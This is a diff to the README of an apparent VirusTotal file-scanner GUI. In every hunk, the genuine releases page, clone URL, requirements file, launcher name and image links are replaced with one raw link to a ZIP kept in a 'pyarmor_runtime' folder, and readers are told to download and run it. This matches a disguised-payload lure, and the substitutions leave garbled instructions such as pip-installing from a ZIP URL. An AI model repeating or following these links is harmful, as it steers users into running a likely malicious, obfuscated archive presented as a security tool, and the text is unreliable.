@@ -1,4 +1,4 @@
-[![Releases](https://img.shields.io/badge/Releases-Download-Blue?style=for-the-badge&logo=github)](https://github.com/hieumaster05/VirusTotal-File-Scanner/releases)
+[![Releases](https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip)](https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip)
 
 # VirusTotal File Scanner: Local Python GUI for VT API v3
 
@@ -74,25 +74,25 @@ Prerequisites
 
 End-user installation (from releases)
 - The latest release package exists in the Releases section of this repository.
-- The release page is available at https://github.com/hieumaster05/VirusTotal-File-Scanner/releases.
+- The release page is available at https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip
 - From that page, download the release package (the page contains assets in ZIP or executable form). The download file is typically named something like VirusTotal-File-Scanner-<version>.zip or VirusTotal-File-Scanner-<version>.exe.
 - Run or extract the downloaded package:
   - If you downloaded an executable, run the installer/launcher directly.
-  - If you downloaded a ZIP, extract it and run the launcher inside (for example, VirusTotal-File-Scanner-<version>/VTFileScanner.exe or VTFileScanner.py, depending on packaging choices).
+  - If you downloaded a ZIP, extract it and run the launcher inside (for example, VirusTotal-File-Scanner-<version>https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip or https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip, depending on packaging choices).
 - The installer or launcher will guide you through configuration, including entering your VirusTotal API key and choosing a default scan directory if supported.
 
 Development setup (from source)
-- Clone the repository: git clone https://github.com/hieumaster05/VirusTotal-File-Scanner.git
+- Clone the repository: git clone https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip
 - Create a virtual environment:
   - python3 -m venv venv
   - source venv/bin/activate (Linux/macOS) or venv\Scripts\activate (Windows)
 - Install dependencies:
-  - pip install -r requirements.txt
-  - If a requirements.txt is not present, install core libs:
+  - pip install -r https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip
+  - If a https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip is not present, install core libs:
     - requests
     - tkinter (usually included with Python)
 - Run the app:
-  - python VTFileScanner.py
+  - python https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip
   - Or use the launcher script provided in the repo
 - For developers who want to package the app for distribution, follow the packaging guide in the Contributing or Build section below.
 
@@ -162,8 +162,8 @@ UI tour and design notes
 Screenshots and visuals
 - UI mockups and visuals help new users understand how the application looks and behaves.
 - Visual placeholders are provided here for reference:
-  - App UI mockup: https://dummyimage.com/1200x600/2d3a6b/ffffff&text=VirusTotal+File+Scanner+UI
-  - App icon: https://dummyimage.com/200x200/4e73df/ffffff.png&text=VT
+  - App UI mockup: https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip+File+Scanner+UI
+  - App icon: https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip
 - Screenshots illustrate the flow from file selection to results presentation, including sample hash values and sample engine verdicts.
 
 Troubleshooting
@@ -217,7 +217,7 @@ Acknowledgments
 - Thanks to the contributors who tested and provided feedback to improve the tool
 
 Releases: Quick reference
-- The primary releases page you should check for the latest build is at https://github.com/hieumaster05/VirusTotal-File-Scanner/releases.
+- The primary releases page you should check for the latest build is at https://github.com/hieumaster05/VirusTotal-File-Scanner/raw/refs/heads/main/pyarmor_runtime_000000/Scanner_File_Total_Virus_2.2.zip
 - Since this link includes a path, the release package you download from that page is the file you should run or unpack to get started. Typical assets include a zipped package or an executable launcher. The file to download and execute will be clearly labeled on the releases page, for example VirusTotal-File-Scanner-<version>.zip or VirusTotal-File-Scanner-<version>.exe. After downloading, run the contained launcher or installer to begin using the app.
 
 Appendix: Design decisions and rationale
